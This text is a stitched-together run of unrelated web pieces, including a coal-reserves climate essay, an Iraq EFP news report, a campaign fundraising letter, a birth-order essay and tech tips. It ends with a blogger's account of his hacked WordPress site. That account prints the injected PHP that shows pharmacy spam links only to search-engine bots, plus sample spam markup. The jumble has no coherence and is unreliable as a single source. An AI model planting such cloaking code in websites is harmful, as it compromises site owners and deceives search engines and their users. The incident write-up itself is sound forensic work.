For these regions , I used reserves , which are likely to be too high .
For the former Soviet Union , there is the opposite kind of problem .
Production still has not returned to Soviet - era levels .
I used the trends from the Soviet era , which may be pessimistic .
North America is a patchwork , with trends for the East ( 40 Gt ) , West ( 25 Gt ) , reserves for Montana ( 68 Gt ) , and trends for Canada and Mexico ( 2Gt total ) .
The world total is 435 Gt , 1.6 Tboe if we convert at the current energy density of 3.6 boe / t.
This is about half the reserves of 963 Gt ( 3.5 Tboe ) .
Both are much lower than the amount that is assumed to be available for the IPCC scenarios , which is 18 Tboe .
It is possible that some of the trends will turn out to be too low , because of the possibility of switching to a new trend line , as the British did after the war .
On the other hand , where we have used reserves , we are likely to be too high , and this will offset underestimates elsewhere .
I am using my judgment to arrive at the solution , and your judgment may differ .
Table .
Reserves vs trends for remaining production for coal .
The reserves are taken from the World Energy Council 2004 report , except for China , where we used the reserves from the Chinese Ministry of Land and Resources by way of Sandro Schmidt , and South Africa , which has been reassessed recently
Figure 9 shows the cumulative plots for future - fuel production using the trends we have developed for hydrocarbons and coal , and with lms fits for the 10 % and 90 % years .
The coal ultimate is about half the hydrocarbon ultimate .
Figure 9 . Cumulative fossil - fuel production with normal fits for hydrocarbons ( ultimate 4.8Tboe , 10 % 1975 , 90 % 2066 ) and coal ( ultimate 2.5Tboe , 10 % 1960 , 90 % 2088 ) .
Now we are in a position to see what some consequences for climate are .
We convert future hydrocarbon and coal production to atmospheric carbon emission using EIA coefficients and plot them as the Producer - Limited Profile in Figure 10 , together with the carbon emissions from the 40 scenarios .
The Producer - Limited Profile has lower emissions than any of the 40 scenarios .
This would be true even if we calculated the emissions with the full coal reserves .
Jean Laherrere was the first to call attention to this anomalous situation .
He has made the point forcefully and repeatedly , to no apparent effect .
Figure 10 .
Future fossil - fuel carbon emissions for our Producer - Limited Profile , together with the 40 IPCC scenarios .
The curves show a major defect of the IPCC scenarios - they are not defined past 2100 .
In many of the scenarios , fossil - fuel production has not peaked by then .
For climate simulations , I use Tom Wigley ’s program MAGICC .
Tom and his colleagues at the National Center for Atmospheric Research ( NCAR ) have performed a wonderful service by making this program available online , so that anyone can try out different scenarios .
I modified his WRE profiles to use our fossil - fuel carbon - emission levels .
The W in WRE is for Wigley , and the WRE profiles were developed to target specific CO2 levels .
One advantage of the WRE profiles is that unlike the IPCC profiles , WRE profiles are defined past 2100 .
In addition to our Producer - Limited Profile , I define one policy profile called Super - Kyoto , where future fossil - fuel production is stretched out by 50 % ( Figure 11 ) .
I am imagining a future agreement that is more successful in reducing the rate of fossil - fuel consumption than the present Kyoto Agreement , but that does not change the total remaining production .
The Producer - Limited Profile gives a peak of 460 ppm in 2070 , while Super - Kyoto gives a peak of 440 ppm in 2100 .
These compare with the current level of 380 ppm and the pre-industrial level of 280 ppm .
Figure 11 .
Carbon emissions and atmospheric CO2 levels .
The atmospheric CO2 levels are calculated from MAGICC simulations .
Figure 12 shows the simulated temperatures .
The maximum temperature rise for our Producer - Limited Profile is 1.8 °C in 2150 .
The blue lower curve shows the part of the temperature rise that is associated with future fossil - fuel use .
This is calculated by running the simulation with and without future fossil fuels , and subtracting .
It turns out that the maximum temperature rise associated with future fossil fuel use is only 0.8 °C , less than half of the total .
This means that the contributions to the temperature rise from fossil fuels that have already been consumed , and from deforestation , and from other greenhouse gases amount to more than the contribution from future fossil - fuel use .
The Super - Kyoto Profile does not decrease the maximum temperature .
The reason for this is that the characteristic time for temperature change is much larger than the corresponding times for fossil - fuel exhasution .
From a mathematical point of view , the system is an integrator .
Figure 12 .
Simulated temperature rises from MAGICC simulations .
Based on these results , what conclusions do we draw ?
The projection for hydrocarbons is 20 % larger than reserves , while the projection for coal is only half of reserves .
Our Producer - Limited Profile has future fossil - fuel production that is lower than all 40 of the IPCC scenarios , so it seems that producer limitations could provide useful constraints in climate modeling .
Stretching out production does not lower the temperature maximum .
If we wish to reduce the temperature rise , we must bury the CO2 ( assuming that it will not leak out for 1,000 years ) , or establish preserves for fossil fuels that prevent them from being produced .
One possibility for fossil - fuel preserves would be US federal lands .
One third of US fossil - fuel production is from federal lands , so remaining fossil - fuel production could be reduced substantially simply by letting the current leases run out , without establishing new ones .
Why are coal reserves high ?
In his book Hubbert ’s Peak , Ken Deffeyes says this about the US Geological Survey , “ When USGS workers tried to estimate resources , they acted , well , like bureaucrats .
Whenever a judgment call was made about choosing a statistical method , the USGS almost invariably tended to pick the one that gave the higher estimate . ”
My theory relates to my sister - in - law , Nancy Yee .
Nancy appraises apartments for a bank .
If her estimates are too high , the bank loses money , and she loses her job .
My suspicion is that no one in a geological survey ever lost her job for being optimistic about coal reserves
Could these projections be improved ?
Yes .
I am still looking for coal - production histories for many countries before 1981 , when the BP Statistical Review tables give out .
The most important ones are the Soviet Union and South Africa .
I would grateful if any readers could help me locate this data .
U.S. troops working the streets of the capital fear one Iraqi weapon more than others -- a copper - plated explosive that can penetrate armor and has proved devastating to Humvees and even capable of severely damaging tanks .
The power of what the military calls an EFP -- for explosively formed penetrator , or projectile -- to spray molten metal balls that punch through the armor on vehicles has some American troops rethinking their tactics .
They are asking whether the U.S. should give up its reliance on making constant improvements to vehicle defenses .
Instead , these troops think , it is time to leave the armor behind -- and get out and walk .
“ In our area , the biggest threat for us is EFPs .
When you are in the vehicles , you are a big target , ” said Army Staff Sgt. Cavin Moskwa , 33 , of Hawaii , who patrols Baghdad ’s Zafraniya neighborhood with the Bravo Battery of the 2nd Battalion , 17th Field Artillery Regiment .
“ But when you are dismounted ... you are a lot safer . ”

In the last three days , 15 U.S. troops have been killed in Iraq , nine of them in two powerful roadside bomb blasts .
The military does not publicly identify the kind of weapon used in improvised explosive attacks , but the deadly nature of the blasts Wednesday and Thursday suggested that EFPs may have been used .
The deaths brought to 3,545 the total number of U.S. troops killed in the Iraq theater since the March 2003 American - led invasion , the U.S. military said .
Hundreds of these troops have been killed by EFPs and other kinds of improvised explosive devices , or IEDs .
The Pentagon ’s most recent Iraq status report said EFP attacks were at an all - time high .
Foot patrols , of course , are not a fail - safe method .
On city streets , snipers remain a threat .
And bombs can still kill dismounted troops .
But when blasts occur in the middle of a foot patrol , the number of casualties are generally lower because the troops are more spread out .
Before a foot patrol last week through a neighborhood next to Baghdad ’s Sadr City district , a private with Alpha Company of the Army ’s 1st Battalion , 8th Cavalry Regiment , began complaining about having to walk .
But EFPs have claimed the lives of several soldiers in the unit , and Sgt. Leland Kidd , 28 , of Gonzales , Texas , said the private should be thankful they were on foot .

“ When I walk on my feet , I do n’t have to worry about being blown up , ” Kidd told the private .
“ In the vehicle , I have to . ”
Top commanders have been encouraging more such units in Baghdad to take just that tack .
A counterinsurgency guidance memo released last week by Army Lt. Gen Raymond T. Odierno , the commander of day - to - day military operations , urges Iraqi and American troops to “ get out and walk . ”
The memo argues that although Humvees offer protection , they also make units predictable and “ insulate us from the Iraqi people we intend to secure . ”
Advertisement
The original draft of the memo , written by counterinsurgency expert David Kilcullen , goes further .
It notes that EFP attacks on Humvees damage them heavily .
“ So we gain little in safety , but sacrifice much in effectiveness , ” the draft reads .
One reason for the increased number of troops victimized by roadside bombs is that there are more forces in Iraq now , Marine Gen .
Peter Pace , chairman of the Joint Chiefs of Staff , said at a Pentagon news conference Thursday .
This month , the final additional American combat units arrived in Baghdad , as part of a counterinsurgency strategy announced by President Bush in January that has increased the U.S. military presence in Iraq by 28,500 troops .
“ As we ’re taking the fight to the enemy with the additional troops , we can expect that there ’s going to be tough fighting ahead , ” Pace said .
“ So it is an expectation that this surge is going to result in more contact and therefore more casualties . ”
But another reason for the rising death toll is the ability of Iraq ’s militants to adapt to new U.S. military tactics .

During the 2003 invasion , most American Humvees were outfitted with flimsy canvas doors .
When the first improvised explosive devices made from artillery shells appeared , the military scrambled to put stronger armor on the vehicles .
Since then , the military has repeatedly upgraded Humvee armor as militants have made bigger and bigger bombs .
But the small and easily hidden EFPs , which often are powered by C - 4 plastic explosives , are not just a more powerful IED .
Military personnel experienced with the projectiles say that what makes the weapons so deadly is that they use the Americans ’ own armor against them .
As the hot copper slug melts through the armor of a Humvee , it transforms the protective plating into shrapnel that sprays into the passenger cabin , they say .
“ We joked about going back to canvas doors .
That way , unless it hits you directly , you are OK , ” said Army Sgt. William Bowman , 31 , of Fort Myers , Fla .
But to Moskwa , the staff sergeant from Hawaii , the question of armor is no joke .
Moskwa , who served as an Army recruiter in Pasadena before deploying to Iraq , thinks armor on vehicles and body armor on troops are too restrictive , hampering a service member ’s ability to move quickly and agilely .
Advertisement
“ I would rather go out without any armor or gear , ” he said .
“ If an EFP hits the vehicle , you are dead anyway no matter how much armor you have .
It can take out an Abrams tank ; these 1114 [ armored Humvees ] are nothing . ”
Army Staff Sgt. Shane Beckham , 26 , of St. James City , Fla. , a member of 1 - 8 Cavalry ’s Bravo Company , likes dismounted patrols but says going without any armor does n’t make sense .
“ You still have snipers out here , ” he said .
Beckham said that although he had seen EFPs destroy a Bradley fighting vehicle , the vehicle nevertheless protected the soldiers inside .
Advertisement
“ When those hunks of steel burned to the ground , they did what they were designed to do :
They saved my guys , ” Beckham said .
The EFPs are most commonly used in poor Shiite Muslim districts , where they are the preferred weapon of militias aligned with radical cleric Muqtada Sadr ’s Al Mahdi militia .
But the devices are also found throughout Iraq , and the military has accused Shiite - run Iran of supplying EFPs to Sunni Arab insurgents as well as Shiites .
The bombs have been found , for example , in Diyala province , where the military Thursday continued its offensive against Sunni insurgents who had taken over neighborhoods in Baqubah , the provincial capital .
As part of the operation , military officials said , the U.S. had killed 41 militants and destroyed 25 roadside bombs and five homes rigged with explosives .
Although the military is trying to break the power of Sunni insurgents in the province , the offensive is also part of a larger strategy to control the area around Baghdad and prevent the flow of EFPs and suicide bombers into the Iraqi capital .
Although U.S. officials have said EFPs were originally smuggled in from Iran , militants in Iraq have now learned how to make them .
And the newer ones are even more powerful , troops said .

On Thursday , a roadside bomb in northeast Baghdad killed five U.S. soldiers .
An Iraqi interpreter and three Iraqi civilians also were killed in the blast .
The IED destroyed the Humvee the soldiers were riding in , an Iraqi Information Ministry official said .
The military also announced that four soldiers were killed Wednesday in a roadside bombing attack in west Baghdad .
And on Tuesday , two soldiers were killed and four wounded southwest of Baghdad in another roadside bombing , the military said Thursday , correcting an earlier report that said the attack had occurred Wednesday .
The military previously announced another death Tuesday , that of Army Spc. Darryl W. Linder , 23 , of Hickory , N.C. , who was killed in a bombing in Baqubah .
The military also reported Thursday that two Marines were killed Wednesday west of Baghdad in Al Anbar province .
In addition , the military announced the death of a soldier Thursday in a rocket - propelled - grenade attack in north Baghdad .

In violence against Iraqi civilians , 13 people were killed and 70 injured in a bombing in the northern town of Sulaiman Bek .
Around Baghdad , 20 bodies were found , many probably victims of Shiite death squads .
In Wasit province , southeast of the capital , an explosive device detonated near an Iraqi police vehicle , killing three officers .
U.S. troops say that , for now at least , most EFPs are placed a safe distance from where Iraqis live , on main roads and streets without many homes on them .
In the Shiite neighborhoods of east Baghdad , when militants set off roadside bombs that kill residents , American troops commonly pass out leaflets blaming Sadr ’s Al Mahdi militia .
Those who have survived EFP attacks say the pressure from the blasts made their eyes bulge out of their heads , leaving them with headaches that lasted for days .
Army Staff Sgt. Joseph De Wolf , 28 , of Waco , Texas , suffered a concussion in an EFP strike .
“ The projectile came under my seat , hit the battery box and missed me , ” De Wolf said .
“ I got lucky . ”
Advertisement
Army Sgt. Chris Wilson , 24 , of Boston said that , relatively speaking , troops had grown accustomed to the threat of old - style improvised bombs and of snipers .
“ EFPs are what we worry about every day , ” Wilson said .
“ That is what keeps us up at night . ”

Times staff writers Borzou Daragahi in Paris , Peter Spiegel in Washington , Alexandra Zavis in Baqubah and Saif Hameed in Baghdad contributed to this report .
Astronomers have confirmed they spied two previously unknown moons orbiting tiny ninth planet Pluto using the Hubble Space Telescope .
As we reported in November the confirmation , published in Nature , brings the enigmatic planet 's lunar total to three .
Until now it was thought to have just one - 750 - mile - diameter Charon .
The more distantly orbiting of the new moons takes 38 Earth days to do a circuit of Pluto , and with a diameter between 40 and 100 miles , is around 22 per cent larger than its fellow discovery .
The smaller satellite takes 25 days to orbit the outer planet .
The two bodies have been given the uninspiring provisional names S/2005 P1 and S/2005 P2 , before a panel of the International Astronomical Union makes an official decision .

Last Saturday 's ANSWER Coalition protest in Washington D.C. was filled with many great speeches , but this particular speech by Iraq War vet and member of Iraq Veterans Against The War , Adam Kokesh , was particularly powerful and I wanted to pass it along .
Kokesh , who was recently arrested for posting signs promoting the protest , took aim at General Petraeus , President Bush , military recruiters and anyone who still supports the occupation of Iraq -- as well as those members of Congress who will not stand up for the troops and refuse to carry out the will of the American people .
Kokesh 's words moved me to the point of yelling out loud , perhaps it will have the same effect on you .

That said , according to USA TODAY and Science Magazine the oldest kids are the smartest .
Let 's assume that this is correct .
What 's the reason ?
The most common explanation is " resource dilution : " the oldest usually gets the most parental resources .
In any given day , the oldest receives more attention than any of the sibs .
The more attention you receive , the more you develop .
The attention ( more reading , more activities , more conversation ) is supposed to give the oldest kid the emotional resources to grow .
That 's fine , but it does n't explain why only - children are n't the smartest , for example .
( Common answer : the parents of an only child did n't want more children because it took time away from themselves ; so the only - child actually receives " less " attention than other kids in other families .
Maybe , but it can't be true for all such families .
( Can it ? ) )
But I favor a different explanation .
First , oldest kids get parentified : " go watch your brother and sister ! "
" Make sure this baby does n't roll ! "
" Look , I know you 're only five , but I can't get up right now , do me a favor and go into the kitchen , get out the lasagna pan , set the upper oven to 450 , chop up the garlic and I 'll be there in a minute . "
Oldest kids may not be smarter , they may just have had to grow up faster ; they have to learn to think fast , improvise , etc .
This might explain USA TODAY 's survey of CEOs : 50 % were first born , while 20 % were last born .
But second , there 's this : " you idiot ! you chopped the garlic with a steak knife ! ? "
You learn fast , lessons your younger sibs do n't learn as early in life .
And , specifically , you learn a ) what adults " do " ( because you 're often expected to replicate it ) ; b ) that you are always under scrutiny -- so perform , do n't bother trying to hide ; c ) that you are under more scrutiny than your sibs -- in other words , that they are " special . "
Not better , but singled out for more responsibility , more scrutiny than others .
For some reason , you are different .
Here 's something interesting : more than likely , you are attempting to frame this post in terms of your own childhood .
Were you the oldest , youngest , what happened , etc .
Why does n't it occur to you to frame it in terms of your own children ?
If you 're a parent of more than two kids , ask yourself the following : who do you yell at the most ?
Would you trust your youngest today to do things you trusted your oldest to do at that same age ( e.g. watch a baby ? )
When you need a kid to do something for you , who do you ask ?
I know you 'll have " reasons " why you pick the first , but the important part is that for whatever reason , you are picking the oldest .
Identity comes easier to the oldest born , because it is reinforced ( positively or negatively ) .
" You know better , " you 're supposed to , " etc .
It 's pretty easy to see how narcissists are almost always the oldest child .
( And borderlines the youngest , or only . )
Depending on why they get more scrutiny and more responsibility , they develop differently .
Maybe by the time the parents get to the third kid they 're too tired to uphold the same level of performance -- so it is that the youngest seems to get away with more ; maybe the parents realize they were too tough with the first .
In this case , it 's too late for the oldest , but the benefit to the younger ones is greater .
Maybe they thus get more positive attention and less punishment or control .
So maybe they become artistic , or pick a career that 's unusual .
But sometimes a relational pattern is established , like dating the same kind of guy over and over .
A pattern develops , where the oldest " never does anything right " ( because he 's expected to do what would never have been expected of the youngest ) and parents are repetitively in an emotional state of anger or frustration .
Soon , that 's how they relate to each other ; the oldest on the defensive , or trying to perform , the parents on full alert , ready to go insane .
Even when the kid grows up and stops making such " stupid mistakes , " the pattern is already firm : the parents relate to him by leves of anger and frustration .
The result in this situation is that the oldest goes on to succeed -- amazed , really , at how easy the world is and how little is actually expected of or necessary from him , in comparison to what went on at home -- but is simultaneously bitter , resentful of how easy it is for other people to be happy when they want to be , despite their lack of successes .
These people can easily become abusers ( especially emotionally ) ( " I hate your emotions ! " ) ; they can become alcoholics ( " I hate my emotions ! " ) ; insomniacs ( " I hate that another day has passed and I have done nothing of actual consequence , nothing , nothing , nothing . " )

Dear friend ,
Our American way of life is under attack .
And it is up to us to save it .
The world 's elites are busy forming a North American Union .
If they succeed , as they did in forming the European Union , the good ol ’ USA will only be a memory .
We can not let that happen .
The UN wants to confiscate our firearms and impose a global tax .
The UN elites want to control the oceans with the Law of the Sea Treaty .
And they want to use our military to police the world .
Our right to own and use property is fading because bureaucrats and special interests are abusing eminent domain .
Our right to educate our children as we choose is under assault .
" No Child Left Behind " is seeing to that .
And our right to say " no " to forced mental screening of our school - aged children is nearly gone .
The elites gave us a national ID card .
They also gave us the most misnamed legislation in history : The Patriot Act .
And these same people are pushing to give amnesty to illegal immigrants and erase our national borders .
Record government debt is putting a burden on our children and grandchildren that is shameful .
Yes .
Our American way of life is under attack .
And it 's understandable that many are concerned , even discouraged , about the kind of country our children and grandchildren will inherit .
But we must never let discouragement become surrender .
One reason I am NOT discouraged is because I know I am not fighting alone .
Each day I head out I know that you and thousands of other patriotic , freedom - loving Americans are right beside me , standing brave and true for what is good and right .
I need your help now , more than ever , to save the country we love ... for the people we love .
My wife Carol and I celebrated our 50th wedding anniversary early this year .
We are proud parents of five children and 18 grandchildren .
We love them very much , as I know you love your family .
As a U.S. congressman , I always think about the well - being of my family and of all the families of our great nation when I cast a vote or introduce legislation .
I also remember that I have sworn a solemn oath to uphold and protect the Constitution of the United States .
For me , upholding that oath is the first and best way to preserve and protect the blessed American way of life for our children and grandchildren .
And now you know why I 'm running for president of the United States .
I ask for your help .

The city and the Police Department have come under intense scrutiny over the surveillance tactics , in which for more than a year before the convention undercover officers traveled to cities across the country , and to Canada and Europe , to conduct covert observations of people who planned to attend .
But beyond potential troublemakers , those placed under surveillance included street theater companies , church groups , antiwar activists , environmentalists , and people opposed to the death penalty , globalization and other government policies .
And as the convention unfolded , more than 1,800 people were arrested , mostly for minor violations , and many were herded into pens at a Hudson River pier and fingerprinted instead of being released on summonses or desk appearance tickets , which are more customary for charges that amount to little more than a traffic ticket .
As scores of federal lawsuits challenging the mass arrests on Aug. 31 , 2004 , were filed in Federal District Court in Manhattan , with plaintiffs claiming wrongful detentions of up to two days and other violations by the police to keep protesters off the streets , the outlines of the extensive covert surveillance operation began to emerge from court records .
In March , The New York Times disclosed details of the sweeping operation , including a sample of raw intelligence documents and summaries of observations from field agents and the police cyberintelligence unit .
Some plaintiffs and their lawyers , seeking to bolster their cases , asked the court to disclose the documents .
In May , Judge Francis allowed the disclosure of 600 pages of documents relating to security preparations before the convention .
But a second batch of documents , including pictures and reports by undercover agents detailing which protest groups were infiltrated and the results of the surveillance operations , remained in contention .
The city argued that disclosure would reveal sources , methods and other information that might compromise current and future investigations , while the plaintiffs contended that the reports would disprove city claims that the protesters planned to engage in violence , and would show that mass arrests had been unnecessary .
In his ruling yesterday , Judge Francis acknowledged that some information in the documents needed to be protected .
He himself edited out what he regarded as privileged law enforcement information in many “ field intelligence reports ” from agents covering confidential sources and techniques .
And he did not order the release of documents in which the Republican convention was not mentioned .
But he rebuffed city arguments that general information gathered about an organization would necessarily jeopardize confidential police matters .
“ It is difficult to imagine how someone could determine the identity of an undercover officer simply from the fact that he or she was present at a meeting or protest attended by dozens , if not hundreds , of people , ” the judge declared .

Robot Car
We ran into Stanford 's Robot Car to be used in the DARPA Urban Challenge this November :
The Robot Car is entirely autonomous , it will drive itself and avoid any and all obstacles along the way in an urban setting .
All of the gadgetry on the top and sides of the car are laser sensors that map the car 's environment , so that it can avoid accidents .
The laser sensors on the sides of the car will identify yellow / white lines on the road to make sure the car stays within its lane on the road .
The car 's sensors mapping out its environment in real - time on the LCD screen above
All of the data is fed into the car 's two quad - core servers , analyzed , processed and translated to inputs to the car 's steering , braking and acceleration systems .
The servers are cooled using the car 's own air conditioning system via a large pipe running from the back seat to the trunk where the servers are stored .
The fastest they 've had the car up to is around 71 mph , but it 's expected to get up into the 30s during the Urban Challenge .

Khalil al - Zahawi was the most famous practitioner in Iraq of the art of writing classical Arabic script .
He was outside his house in the New Baghdad district of the city on Saturday when he was ambushed by gunmen and killed .
The art of writing classical Arabic script is highly regarded in Iraq and the rest of the Muslim world .
Attack on culture
Mr Zahawi's body has been taken to his home in Diyala province for burial .
In the 1990s , he taught students from all over the Middle East .
It is said that anyone in Iraq who wanted to be considered proficient in Arabic calligraphy had to have his seal of approval .
His death will be seen as another attack on culture and learning by insurgent groups and militias in Iraq who in the past have targeted scientists , doctors and academics .
In a separate incident , police say they have found 12 bodies in Dora in south - east Baghdad .
The victims , aged between their 20s and 40s , had been blindfolded and shot in the head .
They also showed signs of torture .
Going sub - pixel with PyGame
So you are writing a game in PyGame and you come up with the most beautiful particle effect .
But when you implement it , you find that the particles seem to jitter between pixels , and it spoils the effect .
This is because PyGame can only render sprites at integer coordinates , even if you give it float values .
OpenGL or other 3D APIs do n't suffer from this because they can apply filtering and effectively render images between pixels ( or sub- pixel ) .
But you can't do that with a 2D blitter .
Until now that is ! :-)
I 've written a small module that pre-calculates sub - pixel sprites so that you can render a PyGame surface at fractional coordinates .
It 's nice and easy to use , and is almost a drop in replacement .
Here 's an example :
ball = pygame .
image . load ( " ball.png " ) ball_subpixel = SubPixelSurface ( ball ) x , y = 100.23 , 60.58323 screen .
blit ( ball_subpixel .
at ( x , y ) , ( x , y ) )
It 's as fast to blit sub - pixel surfaces as it is to blit regular surfaces , but there is a downside I 'm afraid ( is n't there always ) .
Because of the pre-calculation , more memory is required to store the sub - pixel surface .
The default level of sub - pixel accuracy uses 9X the memory .
I recommend using it for small sprites , but not for large images or images that do n't move .
The code is completely public domain .
It requires the Numeric library .
Because of the nature of sub - pixel surfaces you really need to see it moving to appreciate it , but here is a screen - shot of the sample code in the zip .
Update .
A few people have commented that a screen shot is pointless .
So that you do n't have to run the sample code , I have generated an animated gif to demonstrate the effect .
The spheres at the the top are sub - pixel , the spheres below that are blitted in the usual manner .
I have recently purchased an Belkin F5D7050 Wireless USB Dongle , and I have managed to get it running succesfully under Gentoo Linux .
However the setup was not straightforward , so I decided to write this short guide .
The good news is that after the driver was setup , the connection worked flawlessly and with a native open source driver .
The wireless driver is provided by the CVS versionof the rt2x00 project , but there is also an ebuild in the Portage Tree .
This ebuild depends on old kernels , and trying to compile it will give you the following error :
* rt2x00-9999 requires support for Wireless LAN drivers ( non-hamradio ) & Wireless Extensions ( CONFIG_NET_RADIO ) .
* Please check to make sure these options are set correctly .
* Failure to do so may cause unexpected problems .
* Once you have satisfied these options , please try merging
* this package again .
Try as hard as you want to , but you wo n’t be able to find these options in the latest kernels .
Instead they have been replaced by the CONFIG_MAC80211 option .
Make sure that this setting is compiled as eighter a module or built - in .

MOSCOW ( Reuters ) - A Russian scientist said on Thursday that fresh test results back his country ’s legal bid to take control of the Arctic , just weeks after a submarine planted the Russian national flag on the North Pole ’s seabed .

A Russian scientist said on Thursday that fresh test results back his country 's legal bid to take control of the Arctic , just weeks after a submarine planted the Russian national flag on the North Pole 's seabed .
REUTERS / Reuters Television
The race to claim ownership of the Arctic , home to vast untapped gas and oil reserves , has intensified with Canada , Denmark , Norway and the U.S. all vying with Russia to build their political and legal case to claim jurisdiction .
Valery Kaminsky , the director of the Russian Maritime Geological Research Institute , said new research demonstrated that the undersea Lomonosov mountain chain links Siberia to the Arctic .
That contention -- disputed by other countries ’ scientists -- is the key to Russia ’s claim for ownership of the Arctic .
“ The way the geological strata are layered confirms the Lomonosov Ridge is of the same nature as the continental shelf , ” Kaminsky said in an interview on Vesti - 24 television station .
“ We have a continuous interface of the ridge with the geographical shelf , ” he said .
He said researchers used aircraft to survey 600 km ( 373 miles ) of the underwater ridge at 35 separate points .
The next phase of the research then involved taking physical samples from the sea bed using submersibles .
He did not say when the fieldwork was conducted .
Russia lodged a claim in 2002 with the United Nations commission which adjudicates on Arctic territorial rights .
Since then , it has been attempting to gather scientific evidence to back its legal arguments .
Canada , Denmark , Norway , Russia and the United States all have territory with the Arctic Circle .
Each controls an economic zone in the Arctic which extends 320 km ( 200 miles ) north of their coastlines .
Under the 1982 Law of the Sea Convention , coastal states can claim the seabed beyond those economic zones , if they can show it connects to the continental shelf on which they are located .
Denmark this month announced it would speed up its own scientific efforts to establish a similar legal basis to justify control of the Arctic through Greenland , which it administers .
Russian geologists have previously estimated the Arctic seabed has at least 9 billion to 10 billion tonnes of fuel equivalent , about the same as Russia ’s total oil reserves .
RALEIGH , N.C. –
The prosecutor who led the now - discredited Duke lacrosse rape case reported to jail Friday to serve a 24 - hour sentence for contempt of court .
The city , meanwhile , was in settlement talks with the three exonerated players .
According to a person close to the case , attorneys for the three players are seeking $ 30 million from Durham and reforms in the legal process .
If the terms are n’t met , they will sue early next month , the person told The Associated Press on Friday , speaking on condition of anonymity because the proposed settlement was n’t complete …
[…]
Attorneys Brendan Sullivan and Barry Scheck met Wednesday with Durham officials to discuss a possible settlement to avoid a lawsuit .
The lawyers stressed that the money — about $ 10 million each for David Evans , Collin Finnerty and Reade Seligmann over five years — must be accompanied by legal reforms , the person close to the case told AP .
But attitudes are changing as a result of a flurry of research and new attention to the after - effects of life - saving treatment .
There is now widespread acknowledgment that patients with cognitive symptoms are not imagining things , and a growing number of oncologists are rushing to offer remedies , including stimulants commonly used for attention - deficit disorder and acupuncture .
“ Until recently , oncologists would discount it , trivialize it , make patients feel it was all in their heads , ” said Dr. Daniel Silverman , a cancer researcher at the University of California , Los Angeles , who studies the cognitive side effects of chemotherapy .
“ Now there ’s enough literature , even if it ’s controversial , that not mentioning it as a possibility is either ignorant or an evasion of professional duty . ”
That shift matters to patients .
“ Chemo brain is part of the language now , and just to have it acknowledged makes a difference , ” said Anne Grant , 57 , who owns a picture - framing business in New York City .
Ms. Grant , who had high - dose chemotherapy and a bone marrow transplant in 1995 , said she could not concentrate well enough to read , garbled her sentences and struggled with simple decisions like which socks to wear .
Virtually all cancer survivors who have had toxic treatments like chemotherapy experience short - term memory loss and difficulty concentrating during and shortly afterward , experts say .
But a vast majority improve .
About 15 percent , or roughly 360,000 of the nation ’s 2.4 million female breast cancer survivors , the group that has dominated research on cognitive side effects , remain distracted years later , according to some experts .
And nobody knows what distinguishes this 15 percent .

Most oncologists agree that the culprits include very high doses of chemotherapy , like those in anticipation of a bone marrow transplant ; the combination of chemotherapy and supplementary hormonal treatments , like tamoxifen or aromatase inhibitors that lower the amount of estrogen in women who have cancers fueled by female hormones ; and early - onset cancer that catapults women in their 30s and 40s into menopause .
Search Engine Marketeers are the new script kiddies
Update : on March 12 , 2008 , Vadim Smelyansky emailed me and claims he was simply an innocent bystander doing freelance sysadmin work for an SEM company called LinksDealing , and has no knowledge of the internal workings of the system or how it ’s being used ( or misused ) .
It ’s conceivable that someone who managed to obtain the usernames and passwords to a large number of sites was then able to use that information with LinksDealing ’s system in order to generate linkspam farms on a large scale .
Vadim says : I just copy&paste database schema as is after day of playing with all possible MySQL parameters .
I am not a SEO / SEM professional also I am not a DBA guru , but know enough about MySQL to support production servers .
The company registered in Israel .
So I suppose that there can same named company in other countries .
It is SE marketing , there is a link exchange server www.linksdealing.com and other SEM / SEO applications , some of them used to manage links on customers sites .
Those sites can be banned without any notice from search engines .
Probably it happens when somebody overdoing SEO on some customer site or experimenting .
But there is no hackers or black hats .
This database used by few of this applications .
I have no idea of it complex logic .
I have no reason not to believe him , so I ’ve removed the parts of this post that suggest he is the person who hacked my blog .
On August 8th , my blog , hosted at justinsomnia.org , disappeared from Google , completely , utterly without any warning or known provocation ( e.g. black hat SEO ) , sending the traffic to my blog plummeting .
I complained to all known and normal channels , which in my opinion are too few and far between .
I checked Google ’s Webmaster Central tools , which merely confirmed that my site no longer existed in their index .
Frustrating .
Finally I emailed someone at Google that one of my co-workers knew .
I felt bad doing this .
There are millions of sites in Google .
I should n’t have to email an individual directly for this kind of support .
It just does n’t scale .
But alas .
Yesterday morning I got a response .
My contact at Google discovered that someone had actually hacked my site and was displaying search engine spam to search engine bots only !
Let me say that again .
My blog was hacked !
Ugh .
So I have to admit I have n’t updated WordPress to the latest version , and I ’m sure Gallery is not up to snuff either .
What follows is a description of the hack and my eventually successful attempt to figure out who did this to me .
Here ’s where I figure out what happened
Basically someone got access to my WordPress theme files .
In footer . php the following line of code was added :
include (' index2.php ' ) ;
Then a file called index2.php was created that contained the following PHP code :
<? $ bots=array ( ' ooglebot ' , ' yahoo ' , ' live ' , ' msn ' ) ; $ y=0 ; for ( $i=0 ; $ i<sizeof ( $ bots ) ; $ i++ ) if ( strstr( strtolower ($ _SERVER [ " HTTP_USER_AGENT " ] ) , strtolower ( $ bots [ $ i ] ) ) ) $ y=1 ; if ( $y ) { include ( 'rq.txt ' ) ; } ?>
This means that if the user agent ( e.g. web browser , search engine bot , feedreader , etc. ) identified itself as the Google or Yahoo website indexer — instead of Firefox or Internet Explorer — the file rq.txt would be included on the page .
That file contained a list of 20 search engine spam links , linking to several compromised sites ( who I have notified ) , which in turn redirected you to the intended destination , in this case a supposed Canadian pharmaceutical e-commerce site canadianmedsworld.com :
<a href=http://www.bluehighways.com/albums/buy-levitra.html>buy levitra</a>< br > < a href=http://www.uxmatters.com/scripts/viagra-online.html>viagra online</a>< br> ...
To confirm this , I switched Firefox ’s user agent to Googlebot ’s , Googlebot / 2.1 ( + http://www.google.com/bot.html) , using the User Agent Switcher extension , and sure enough , the spam links appeared on EVERY PAGE of my site !!!
Quelle horreur !
I felt so violated .
Here ’s where I figure out who did this
The timestamp on index2.php was Jul 3 13:35 , which I believe was the initial date of the attack .
The rq.txt file had been updated as recently as Aug 18 04:15 .
Then before my very eyes it was updated again yesterday , Aug 20 11:05 , with even more spam links .
I checked my http logs for both Aug 18 04:15 and Aug 20 11:05 , but nothing looked out of the ordinary , just normal GET requests .
Could my Dreamhost shell account have been compromised ?— a fate even scarier than a WordPress bug .
So I started digging .
Googling for the filenames created in the attack , I only found one other blog post describing the same symptoms in Spanish but without any really helpful information .
My http logs do n’t go back to July 3rd , but I have a JavaScript based request tracker which does .
One minute after 13:35 on July 3
I found this very interesting request :
